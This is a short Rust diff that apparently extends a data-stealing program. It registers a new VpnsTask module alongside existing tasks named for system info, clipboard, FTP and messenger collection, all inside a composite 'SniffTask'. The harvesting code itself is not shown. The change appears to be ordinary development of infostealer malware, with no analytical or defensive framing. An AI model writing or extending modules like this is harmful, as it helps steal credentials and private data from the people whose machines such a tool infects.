@@ -15,6 +15,7 @@ use alloc::vec;
 use ftp::FtpTask;
 use messengers::MessengersTask;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
+use vpns::VpnsTask;
 
 pub struct SniffTask {
     inner: CompositeTask
@@ -29,7 +30,8 @@ impl SniffTask {
                 SystemInfoTask,
                 ClipboardTask,
                 FtpTask::new(),
-                MessengersTask::new()
+                MessengersTask::new(),
+                VpnsTask::new()
             )
         }
     }
